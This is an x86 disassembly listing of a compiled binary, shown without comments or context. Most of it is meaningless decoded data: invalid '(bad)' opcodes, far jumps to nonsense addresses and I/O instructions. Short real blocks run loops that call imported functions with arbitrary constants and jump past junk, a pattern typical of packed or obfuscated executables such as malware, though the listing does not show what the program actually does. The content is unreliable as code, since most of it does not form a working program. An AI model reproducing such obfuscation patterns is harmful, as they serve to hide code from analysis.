  40a141:	adc    ecx,edx
  40a143:	mov    bl,0xee
  40a145:	arpl   bp,bp
  40a147:	int    0x2a
  40a149:	stos   BYTE PTR es:[edi],al
  40a14a:	push   esi
  40a14b:	and    eax,0x3b3a716d
  40a150:	jne    0x40a183
  40a152:	rcl    BYTE PTR [ebp+0x50d20b3e],0xd4
  40a159:	call   0x88c0930a
  40a15e:	jge    0x40a0f0
  40a160:	icebp  
  40a161:	pop    ebx
  40a162:	out    0xeb,eax
  40a164:	js     0x40a114
  40a166:	and    esi,esi
  40a168:	test   al,0xe9
  40a16a:	inc    esi
  40a16b:	xchg   BYTE PTR [ecx+esi*4],al
  40a16e:	and    eax,0x6bc1aa9f
  40a173:	int3   
  40a174:	push   cs
  40a175:	rcl    ebp,cl
  40a177:	xchg   edi,eax
  40a178:	sbb    bl,BYTE PTR [eax-0x10]
  40a17b:	in     eax,0xc4
  40a17d:	ds fst st(2)
  40a180:	add    DWORD PTR [ecx+eax*8-0x22add0af],edx
  40a187:	or     BYTE PTR [esi-0x2c],cl
  40a18a:	mov    ebx,0x4309b80c
  40a18f:	iret   
  40a190:	test   al,0xa8
  40a192:	sar    BYTE PTR [eax-0x5],1
  40a195:	iret   
  40a196:	inc    ebx
  40a197:	cmc    
  40a198:	cs sti 
  40a19a:	adc    BYTE PTR [esi-0x6d00ab02],0xf9
  40a1a1:	pop    edx
  40a1a2:	mov    edx,0x4ed87002
  40a1a7:	scas   al,BYTE PTR es:[edi]
  40a1a8:	push   cs
  40a1a9:	dec    edx
  40a1aa:	or     BYTE PTR [ebp-0xb],bh
  40a1ad:	js     0x40a21e
  40a1af:	shl    DWORD PTR [ebx-0x33f55e95],1
  40a1b5:	sar    BYTE PTR [ebx],1
  40a1b7:	imul   BYTE PTR [ebx]
  40a1b9:	(bad)  
  40a1ba:	push   edi
  40a1bb:	out    0x7a,eax
  40a1bd:	xlat   BYTE PTR ds:[ebx]
  40a1be:	jnp    0x40a1a8
  40a1c0:	es mov esi,0x2ac9e7e5
  40a1c6:	xchg   esi,eax
  40a1c7:	aam    0xd0
  40a1c9:	loope  0x40a22a
  40a1cb:	inc    edx
  40a1cc:	shr    BYTE PTR [ecx-0x19],1
  40a1cf:	xlat   BYTE PTR fs:[ebx]
  40a1d1:	icebp  
  40a1d2:	dec    eax
  40a1d3:	xchg   DWORD PTR [eax+0x6a],edx
  40a1d6:	repnz push 0xffffffb8
  40a1d9:	inc    ebx
  40a1da:	dec    ecx
  40a1db:	cmp    BYTE PTR [edi],ch
  40a1dd:	call   0x33a3:0x1fbed4b1
  40a1e4:	repnz mov dl,0x14
  40a1e7:	jg     0x40a268
  40a1e9:	cmp    eax,0xadabe4a2
  40a1ee:	xchg   ecx,eax
  40a1ef:	aas    
  40a1f0:	jns    0x40a220
  40a1f2:	gs clc 
  40a1f4:	mov    edi,DWORD PTR [eax+esi*8+0x5f]
  40a1f8:	cmc    
  40a1f9:	push   es
  40a1fa:	pushf  
  40a1fb:	test   al,0x8e
  40a1fd:	clc    
  40a1fe:	mov    edi,0xfdbe5894
  40a203:	out    0xc1,eax
  40a205:	fldpi  
  40a207:	cmp    DWORD PTR [eax+0x12],esi
  40a20a:	add    esp,esi
  40a20c:	xor    ebp,esi
  40a20e:	ss xchg esi,eax
  40a210:	mov    ebp,0x8df90d73
  40a215:	repz xchg esp,ebp
  40a218:	jns    0x40a19b
  40a21a:	rol    BYTE PTR [ecx-0x1e1964b4],cl
  40a220:	inc    edi
  40a221:	xchg   edx,eax
  40a222:	pop    edx
  40a223:	mov    eax,ds:0x9f8920dd
  40a228:	pop    ebx
  40a229:	mov    eax,ds:0x64987dd7
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fced,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	inc    esi
  40a2c5:	(bad)  
  40a2c6:	dec    esp
  40a2c7:	jne    0x40a30e
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a2c0
  40a2d1:	clc    
  40a2d2:	cmp    ah,cl
  40a2d4:	les    ebx,FWORD PTR ss:[eax+0x46]
  40a2d8:	adc    BYTE PTR [eax+0x2efd2cfd],cl
  40a2de:	aad    0x3e
  40a2e0:	out    0x30,al
  40a2e2:	mov    eax,ds:0xcc282807
  40a2e7:	mov    edx,0x64136f14
  40a2ec:	xor    al,0x41
  40a2ee:	xor    dh,al
  40a2f0:	icebp  
  40a2f1:	imul   edx,DWORD PTR [eax],0xdcc8781a
  40a2f7:	or     eax,0x611479e6
  40a2fc:	pop    ebx
  40a2fd:	mov    DWORD PTR [eax+0x5b],esp
  40a300:	(bad)  
  40a301:	cmp    edx,esp
  40a303:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a304:	sub    eax,0x20f281d5
  40a309:	aaa    
  40a30a:	lods   al,BYTE PTR ds:[esi]
  40a30b:	cwde   
  40a30c:	outs   dx,BYTE PTR ds:[esi]
  40a30d:	xlat   BYTE PTR ds:[ebx]
  40a30e:	leave  
  40a30f:	cld    
  40a310:	add    bl,BYTE PTR [ebp-0x6]
  40a313:	ins    DWORD PTR es:[edi],dx
  40a314:	and    BYTE PTR [ebx-0x11],0xfb
  40a318:	outs   dx,DWORD PTR ds:[esi]
  40a319:	xchg   edx,eax
  40a31a:	inc    ebx
  40a31b:	call   0x2160:0x14b9de19
  40a322:	fdiv   QWORD PTR [edx]
  40a324:	sti    
  40a325:	push   esp
  40a326:	push   es
  40a327:	dec    ecx
  40a328:	jne    0x40a33c
  40a32a:	addr16 add eax,0xe11ec71b
  40a330:	adc    al,0xa4
  40a332:	ret    0x85fc
  40a335:	pop    ebx
  40a336:	ja     0x40a339
  40a338:	jmp    0xadf11e58
  40a33d:	add    eax,0xff3e2609
  40a342:	jl     0x40a380
  40a344:	out    0x3f,al
  40a346:	xor    al,0xb6
  40a348:	jle    0x40a3ab
  40a34a:	jmp    0x27f502b7
  40a34f:	cmp    esi,esp
  40a351:	imul   eax,ecx,0x1c
  40a354:	jp     0x40a386
  40a356:	js     0x40a2e7
  40a358:	or     DWORD PTR [eax],ebp
  40a35a:	push   0x53065042
  40a35f:	ror    DWORD PTR [edi],0xbd
  40a362:	bswap  esi
  40a364:	jmp    0x6672316a
  40a369:	pushw  cs
  40a36b:	ins    BYTE PTR es:[edi],dx
  40a36c:	ja     0x40a317
  40a36e:	xchg   ecx,eax
  40a36f:	mov    al,0x15
  40a371:	xchg   ecx,eax
  40a372:	mov    esi,0x3e8bcabc
  40a377:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a378:	cmc    
  40a379:	adc    DWORD PTR [eax],edi
  40a37b:	fild   WORD PTR [ebp+0x59]
  40a37e:	fcom   QWORD PTR [edx]
  40a380:	or     bl,BYTE PTR [edx]
  40a382:	mov    esp,0xe7f9cf5e
  40a387:	shr    DWORD PTR [ebp-0x38094f91],cl
  40a38d:	mov    eax,ds:0xbf1af208
  40a392:	ins    DWORD PTR es:[edi],dx
  40a393:	(bad)  
  40a394:	out    0x45,eax
  40a396:	sbb    DWORD PTR [eax],ecx
  40a398:	jne    0x40a381
  40a39a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a39b:	ins    BYTE PTR es:[edi],dx
  40a39c:	loop   0x40a372
  40a39e:	mov    dh,0xe4
  40a3a0:	fucomi st,st(3)
  40a3a2:	mov    edx,esi
  40a3a4:	enter  0x621e,0xf8
  40a3a8:	ficomp DWORD PTR [eax-0x7e]
  40a3ab:	and    al,BYTE PTR [esi]
  40a3ad:	mov    ch,0x6d
  40a3af:	aad    0x75
  40a3b1:	sbb    al,0xa2
  40a3b3:	add    al,0x7d
  40a3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3b6:	retf   0x78d5
  40a3b9:	cs dec edi
  40a3bb:	lea    edi,[eax-0xc967dba]
  40a3c1:	mov    ebp,?
  40a3c3:	fild   QWORD PTR [ecx]
  40a3c5:	aas    
  40a3c6:	iret   
  40a3c7:	adc    ebx,DWORD PTR [ebp-0x5d]
  40a3ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a3cb:	mov    WORD PTR [ebp+esi*2-0x33],ds
  40a3cf:	clc    
  40a3d0:	jmp    0xb438:0xb99bfafc
  40a3d7:	std    
  40a3d8:	imul   ebx,DWORD PTR ds:0x222fe85c,0xb0283ab2
  40a3e2:	xchg   ecx,eax
  40a3e3:	punpckhbw mm0,mm4
  40a3e6:	rol    bh,cl
  40a3e8:	mov    ds:0xc2189655,eax
  40a3ed:	fisub  DWORD PTR [eax+0x62]
  40a3f0:	xchg   edi,eax
  40a3f1:	cli    
  40a3f2:	fstp   DWORD PTR [edi+esi*2]
  40a3f5:	fnstcw WORD PTR [esi-0x23]
  40a3f8:	call   0x35ea13ba
  40a3fd:	push   ebp
  40a3fe:	mov    al,0x19
  40a400:	je     0x40a399
  40a402:	ds test eax,0x24501d61
  40a408:	mov    bh,0x84
  40a40a:	mov    ch,0x7e
  40a40c:	lock mul DWORD PTR [esi-0x9bbabfd]
  40a413:	clc    
  40a414:	jmp    0xb827:0xdc03a2a
  40a41b:	mov    edx,ebx
  40a41d:	xchg   bh,ch
  40a41f:	or     DWORD PTR [edi+0x32],ebx
  40a422:	clc    
  40a423:	in     eax,0x85
  40a425:	cmc    
  40a426:	outs   dx,BYTE PTR ds:[esi]
  40a427:	sub    eax,0xd5a855cd
  40a42c:	xchg   edx,eax
  40a42d:	call   FWORD PTR [eax+0x7a]
  40a430:	inc    esi
  40a431:	mov    ecx,0x7aa870b9
  40a436:	cvtdq2ps xmm7,XMMWORD PTR [ebx+edi*2]
  40a43a:	shl    DWORD PTR [eax+0x3c693760],1
  40a440:	test   al,0x9
  40a442:	in     al,dx
  40a443:	stos   DWORD PTR es:[edi],eax
  40a444:	dec    ebp
  40a445:	sub    BYTE PTR [eax+0xa577412],bl
  40a44b:	or     esp,esi
  40a44d:	jns    0x40a4b3
  40a44f:	ds add eax,0xda260116
  40a455:	mov    ebx,0x6e4d76c7
  40a45a:	mov    ebp,0x32408f75
  40a45f:	add    ebp,DWORD PTR [edx]
  40a461:	push   edx
  40a462:	pop    edx
  40a463:	addr16 aaa 
  40a465:	les    ebx,FWORD PTR [ebx+0x6259817]
  40a46b:	(bad)  
  40a46c:	ds jne 0x40a4b3
  40a46f:	adc    esi,ebx
  40a471:	pop    esi
  40a472:	mov    ds:0xafe64522,eax
  40a477:	mov    ebx,0xd018dee6
  40a47c:	dec    esi
  40a47d:	jmp    0x40a430
  40a47f:	xor    DWORD PTR [ebx+0x11d380d8],edx
  40a485:	inc    esp
  40a486:	dec    eax
  40a487:	mov    ebx,ebx
  40a489:	mov    ebx,0x742f89e7
  40a48e:	push   es
  40a48f:	out    0x14,al
  40a491:	adc    eax,0xfa5beacb
  40a496:	mov    ch,0xff
  40a498:	push   edi
  40a499:	cs adc eax,0x6077e438
  40a49f:	mov    bl,0xb0
  40a4a1:	mov    esi,0x5a3f9399
  40a4a6:	push   ecx
  40a4a7:	int    0x3f
  40a4a9:	js     0x40a454
  40a4ab:	in     eax,dx
  40a4ac:	mov    al,0x6b
  40a4ae:	imul   ebp,edx,0x21c12ce1
  40a4b4:	into   
  40a4b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a4b6:	in     al,dx
  40a4b7:	pop    edx
  40a4b8:	push   cs
  40a4b9:	cwde   
  40a4ba:	imul   esp,DWORD PTR [ebx-0x6fcc7f6b],0xcdaa42a3
  40a4c4:	retf   
  40a4c5:	add    ebp,eax
  40a4c7:	jmp    FWORD PTR [ebx+ecx*2-0x2a]
  40a4cb:	mov    di,0x7e08
  40a4cf:	and    al,0xb6
  40a4d1:	dec    esi
  40a4d2:	in     al,dx
  40a4d3:	daa    
  40a4d4:	std    
  40a4d5:	jno    0x40a548
  40a4d7:	shr    DWORD PTR [eax+0x4f88e6a8],0x1f
  40a4de:	inc    ecx
  40a4df:	in     eax,0xa5
  40a4e1:	dec    eax
  40a4e2:	(bad)  
  40a4e3:	jle    0x40a490
  40a4e5:	inc    edx
  40a4e6:	not    eax
  40a4e8:	gs ret 0x671a
  40a4ec:	push   cs
  40a4ed:	aas    
  40a4ee:	jb     0x40a4aa
  40a4f0:	aas    
  40a4f1:	xlat   BYTE PTR ds:[ebx]
  40a4f2:	in     al,0x89
  40a4f4:	(bad)  
  40a4f6:	daa    
  40a4f7:	sar    DWORD PTR [ebp+0x68],cl
  40a4fa:	test   BYTE PTR ds:0x44fb5dfd,dl
  40a500:	pushf  
  40a501:	repz push 0x21
  40a504:	repnz or al,0xf6
  40a507:	gs dec eax
  40a509:	jge    0x40a547
  40a50b:	mov    ds,WORD PTR [ebp+0x64]
  40a50e:	dec    ebx
  40a50f:	jno    0x40a4d9
  40a511:	dec    eax
  40a512:	pop    ebx
  40a513:	or     ebp,DWORD PTR [edx]
  40a515:	and    cl,BYTE PTR [edx+0x15]
  40a518:	mov    bh,0x8
  40a51a:	lds    edi,FWORD PTR [ecx+edi*2-0x75333aa0]
  40a521:	ret    
  40a522:	push   ebx
  40a523:	mov    ebx,DWORD PTR [esi+0x24]
  40a526:	dec    ebx
  40a527:	or     eax,0xee33fe8c
  40a52c:	push   cs
  40a52d:	ret    0x72be
  40a530:	inc    ebp
  40a531:	int3   
  40a532:	dec    eax
  40a533:	xor    bl,BYTE PTR [eax]
  40a535:	jbe    0x40a55e
  40a537:	jb     0x40a541
  40a539:	xlat   BYTE PTR ds:[ebx]
  40a53a:	inc    esi
  40a53b:	mov    dh,BYTE PTR [ebx]
  40a53d:	push   ecx
  40a53e:	mov    edx,0x6268578e
  40a543:	call   0x6f29:0xdaf89517
  40a54a:	mov    ebp,0x5ebf2914
  40a54f:	int3   
  40a550:	xchg   edx,eax
  40a551:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a552:	mov    bh,0xf3
  40a554:	xor    dh,BYTE PTR ds:0xdb379876
  40a55a:	xor    dh,dh
  40a55c:	xchg   edi,eax
  40a55d:	xchg   BYTE PTR [esi-0x420d3787],ch
  40a563:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a564:	or     al,ah
  40a566:	jno    0x40a57e
  40a568:	es cdq 
  40a56a:	ins    BYTE PTR es:[edi],dx
  40a56b:	leave  
  40a56c:	and    BYTE PTR [esi+edi*4],0x72
  40a570:	sub    ebp,ebp
  40a572:	xor    ebp,DWORD PTR [ebx+0x3b]
  40a575:	(bad)  
  40a576:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a577:	sbb    al,0xd7
  40a579:	sti    
  40a57a:	or     bl,bl
  40a57c:	xchg   ebp,eax
  40a57d:	mov    esi,DWORD PTR [edi]
  40a57f:	lock xor BYTE PTR [esi-0x28],bh
  40a583:	shr    BYTE PTR [eax-0xaf6d175],cl
  40a589:	inc    ecx
  40a58a:	daa    
  40a58b:	sub    al,0x55
  40a58d:	test   DWORD PTR [edx],0x4b0ce7fe
  40a593:	pop    ds
  40a594:	push   ebx
  40a595:	hlt    
  40a596:	inc    eax
  40a597:	mov    dl,0x68
  40a599:	jo     0x40a59a
  40a59b:	add    bh,0x4d
  40a59e:	inc    eax
  40a59f:	add    dh,0x4b
  40a5a2:	mov    dl,0xee
  40a5a4:	xor    eax,0xc6839c01
  40a5a9:	dec    eax
  40a5aa:	cmp    eax,ebp
  40a5ac:	shl    DWORD PTR [edi],1
  40a5ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5af:	jo     0x40a552
  40a5b1:	xchg   ebx,eax
  40a5b2:	add    cl,dh
  40a5b4:	mov    al,ds:0x6afc366d
  40a5b9:	clc    
  40a5ba:	mov    bl,0x9f
  40a5bc:	cld    
  40a5bd:	in     al,0x94
  40a5bf:	dec    eax
  40a5c0:	bound  ecx,QWORD PTR [esi-0x142ad8f]
  40a5c6:	lahf   
  40a5c7:	xor    eax,0x1579a47b
  40a5cc:	mul    sp
  40a5cf:	mov    al,ds:0xe9671d17
  40a5d4:	ins    BYTE PTR es:[edi],dx
  40a5d5:	xor    eax,ebx
  40a5d7:	mov    al,ds:0x8f09133c
  40a5dc:	sti    
  40a5dd:	paddsb mm3,QWORD PTR [ebx+0x0]
  40a5e1:	inc    ebx
  40a5e2:	rcr    BYTE PTR [eax],0x52
  40a5e5:	sbb    eax,0x34657ed2
  40a5ea:	inc    esi
  40a5eb:	jp     0x40a63e
  40a5ed:	pushf  
  40a5ee:	adc    al,0xdd
  40a5f0:	fld    DWORD PTR [ecx-0x3]
  40a5f3:	daa    
  40a5f4:	call   0xa4df2874
  40a5f9:	sti    
  40a5fa:	pop    es
  40a5fb:	and    al,0x9d
  40a5fd:	popa   
  40a5fe:	adc    al,0x64
  40a600:	push   esp
  40a601:	fnstenv [edx]
  40a603:	xor    esi,edx
  40a605:	dec    edx
  40a606:	jbe    0x40a67b
  40a608:	pop    ds
  40a609:	daa    
  40a60a:	mov    eax,0x1fcc4f1b
  40a60f:	stos   BYTE PTR es:[edi],al
  40a610:	jmp    0xd4347fad
  40a615:	xchg   BYTE PTR [ebx+0x20],ch
  40a618:	xor    BYTE PTR [edx+0x59],ch
  40a61b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a61c:	(bad)  
  40a61d:	imul   edi,DWORD PTR [edi+ecx*8],0x1a
  40a621:	or     ebp,edi
  40a623:	retf   
  40a624:	jecxz  0x40a669
  40a626:	leave  
  40a627:	mov    esi,0x107280a3
  40a62c:	imul   esp,DWORD PTR [ebx+0x1198d05a],0xe8f8f14e
  40a636:	jmp    0x6611:0x7aa83451
  40a63d:	mov    cr4,eax
  40a640:	jns    0x40a607
  40a642:	mov    dl,al
  40a644:	lods   al,BYTE PTR ds:[esi]
  40a645:	pop    ds
  40a646:	call   0xa194feaf
  40a64b:	aas    
  40a64c:	add    eax,0x9d5d11c4
  40a651:	in     eax,0x44
  40a653:	mov    edx,0x762d1d18
  40a658:	cmp    DWORD PTR [esp+eax*1+0x6b],ebx
  40a65c:	fiadd  WORD PTR [ecx-0x3b]
  40a65f:	out    0xdf,eax
  40a661:	pusha  
  40a662:	fist   WORD PTR [eax+ecx*2]
  40a665:	fisub  DWORD PTR [ecx+0x38]
  40a668:	pop    esi
  40a669:	outs   dx,BYTE PTR ds:[esi]
  40a66a:	outs   dx,BYTE PTR ds:[esi]
  40a66b:	push   esi
  40a66c:	mov    WORD PTR [eax+0x32],fs
  40a66f:	retf   
  40a670:	clc    
  40a671:	mov    DWORD PTR [ebp-0x34],0xf89c853c
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	pop    edi
  40a854:	cmp    eax,0xf1e4c455
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a7e5
  40a860:	mov    edx,DWORD PTR [ebp+0x58]
  40a863:	stos   DWORD PTR es:[edi],eax
  40a864:	cmp    esi,edi
  40a866:	js     0x40a84d
  40a868:	jmp    0xaa9caee2
  40a86d:	mov    ecx,0xbdb5c28b
  40a872:	push   cs
  40a873:	or     DWORD PTR [ebp+0x3fadcf72],esi
  40a879:	ins    DWORD PTR es:[edi],dx
  40a87a:	pop    eax
  40a87b:	jne    0x40a893
  40a87d:	pop    edx
  40a87e:	scas   eax,DWORD PTR es:[edi]
  40a87f:	loope  0x40a845
  40a881:	pop    eax
  40a882:	loope  0x40a8cf
  40a884:	inc    esp
  40a885:	les    esi,FWORD PTR [ebp-0x4f]
  40a888:	cmp    al,0x75
  40a88a:	sbb    al,0xfc
  40a88c:	cmp    ecx,DWORD PTR ds:0x8771d14f
  40a892:	cmc    
  40a893:	out    0x86,al
  40a895:	movzx  edx,WORD PTR [ebp+0x73c5d6c8]
  40a89c:	xchg   esi,eax
  40a89d:	sub    BYTE PTR [ebx],dh
  40a89f:	mov    ds:0x99c7df1a,eax
  40a8a4:	sahf   
  40a8a5:	pop    ds
  40a8a6:	lea    edi,[eax]
  40a8a8:	popf   
  40a8a9:	or     cl,BYTE PTR [ecx+esi*4]
  40a8ac:	jns    0x40a8e4
  40a8ae:	jmp    0x333e:0x7bf2b34e
  40a8b5:	jb     0x40a8bf
  40a8b7:	xchg   ebp,eax
  40a8b8:	lods   eax,DWORD PTR ds:[esi]
  40a8b9:	fsubr  QWORD PTR [edx+0x3c278679]
  40a8bf:	mov    esi,0xaa869d61
  40a8c4:	inc    esp
  40a8c5:	inc    ecx
  40a8c6:	cmp    al,0x17
  40a8c8:	xchg   ebp,eax
  40a8c9:	xchg   edx,eax
  40a8ca:	and    esp,DWORD PTR [ecx]
  40a8cc:	push   0xffffffb9
  40a8ce:	mov    eax,ds:0x94508e43
  40a8d3:	or     eax,0xd2307060
  40a8d8:	lea    ebx,[ebp+ecx*2-0x53]
  40a8dc:	jmp    0x89f096f1
  40a8e1:	rol    DWORD PTR [eax-0x10],0xcf
  40a8e5:	shl    edx,1
  40a8e7:	pop    edx
  40a8e8:	mov    esp,0x833b85ea
  40a8ed:	(bad)  
  40a8ee:	mov    ebp,0xfd6d43be
  40a8f3:	das    
  40a8f4:	or     BYTE PTR [esi-0x74548246],ch
  40a8fa:	jmp    0x54bff4cc
  40a8ff:	mov    ah,BYTE PTR [edx-0x65]
  40a902:	test   DWORD PTR [esi+edi*1],ebx
  40a905:	jbe    0x40a8ce
  40a907:	sbb    DWORD PTR [edx+0x61],ecx
  40a90a:	inc    ebp
  40a90b:	repz push 0x933e8522
  40a911:	retf   0xa9fc
  40a914:	cmp    ebp,DWORD PTR ds:0x4ecc1e85
  40a91a:	push   ss
  40a91b:	push   cs
  40a91c:	popf   
  40a91d:	mov    cl,0x48
  40a91f:	mov    al,0x77
  40a921:	adc    al,0xf9
  40a923:	sahf   
  40a924:	and    edx,DWORD PTR [esi-0x419163fa]
  40a92a:	ret    
  40a92b:	jle    0x40a905
  40a92d:	(bad)  
  40a92e:	popf   
  40a92f:	ret    0xe603
  40a932:	sar    BYTE PTR [edi-0x5a9a0cd4],cl
  40a938:	mov    bh,0xd9
  40a93a:	mov    edi,0x8cdfa5df
  40a93f:	hlt    
  40a940:	stc    
  40a941:	mov    eax,0xac9534e2
  40a946:	arpl   WORD PTR [esi+ebx*4-0x46],bx
  40a94a:	bound  edi,QWORD PTR [ecx+0x2a9d855f]
  40a950:	sub    al,0x53
  40a952:	inc    esi
  40a953:	retf   0xd35e
  40a956:	rcr    DWORD PTR [edi+0x2c],cl
  40a959:	xor    ebp,edx
  40a95b:	repz rol DWORD PTR [ebx],cl
  40a95e:	mov    bl,0xd8
  40a960:	mov    bh,0x11
  40a962:	push   0x7d
  40a964:	push   ds
  40a965:	sbb    esp,DWORD PTR [ebx]
  40a967:	jns    0x40a9b2
  40a969:	push   cs
  40a96a:	push   ebx
  40a96b:	scas   al,BYTE PTR es:[edi]
  40a96c:	sbb    DWORD PTR ds:0xa4c9f984,0x9564a704
  40a976:	(bad)  
  40a977:	sbb    DWORD PTR [ebx+0x7fefbc9a],ecx
  40a97d:	xchg   edi,eax
  40a97e:	push   edx
  40a97f:	mov    bh,0xc7
  40a981:	cwde   
  40a982:	xchg   edx,eax
  40a983:	jecxz  0x40a97d
  40a985:	idiv   BYTE PTR [ecx+0x7f]
  40a988:	pop    ecx
  40a989:	adc    eax,0xa25de634
  40a98e:	sub    eax,0xbb7fe550
  40a993:	aam    0x62
  40a995:	shl    bl,0xf0
  40a998:	(bad)  
  40a99a:	mul    DWORD PTR [ebx-0x60e476e8]
  40a9a0:	push   0xe19a6b9e
  40a9a5:	cmc    
  40a9a6:	bound  eax,QWORD PTR [esi-0x1d135d88]
  40a9ac:	lds    ebx,FWORD PTR [esi+0x32]
  40a9af:	hlt    
  40a9b0:	add    eax,0x206cf961
  40a9b5:	and    eax,0x69023371
  40a9ba:	sti    
  40a9bb:	pop    edx
  40a9bc:	test   eax,0xa389f64e
  40a9c1:	imul   ebx,DWORD PTR ds:0xcd7b833c,0x81b8cc24
  40a9cb:	sar    BYTE PTR [ecx-0x1a28a008],1
